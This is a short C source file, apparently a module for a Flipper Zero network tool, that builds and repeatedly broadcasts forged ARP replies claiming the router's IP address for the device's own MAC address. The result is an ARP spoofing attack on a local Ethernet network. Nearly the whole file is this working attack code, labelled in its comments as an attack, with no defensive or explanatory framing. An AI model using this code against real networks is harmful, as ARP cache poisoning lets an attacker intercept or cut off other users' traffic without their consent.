#include "arp_module.h"
#include "../libraries/generals/ethernet_generals.h"
#include "../libraries/protocol_tools/ethernet_protocol.h"
#include "../libraries/protocol_tools/arp.h"

// Packets sent per second
uint8_t packet_rate = 100;

/**
 * Function to set our arp message for attack
 *
 */
void set_arp_message_for_attack_all(
    uint8_t* buffer,
    uint8_t* MAC,
    uint8_t* ip_for_router,
    uint16_t* len) {
    set_ethernet_header(buffer, MAC, MAC_BROADCAST, 0x806);

    // For the ArpSpoofing we need to send this continuosly
    arp_set_header_ipv4(
        buffer + ETHERNET_HEADER_LEN, MAC, MAC_BROADCAST, ip_for_router, IP_BROADCAST, 0x0002);

    // Set the length of the message
    *len = ETHERNET_HEADER_LEN + ARP_LEN;
}

/**
 * Function to attack the ethernet network with arp spoofing
 *
 * Buffer needs to set before with an arp function to set the message
 */
void send_arp_spoofing(enc28j60_t* ethernet, uint8_t* buffer, uint16_t len) {
    static uint32_t prev_time = 0;

    if((furi_get_tick()) > (prev_time + (1000 / packet_rate))) {
        send_packet(ethernet, buffer, len); // Send packet
        prev_time = furi_get_tick();
    }
}
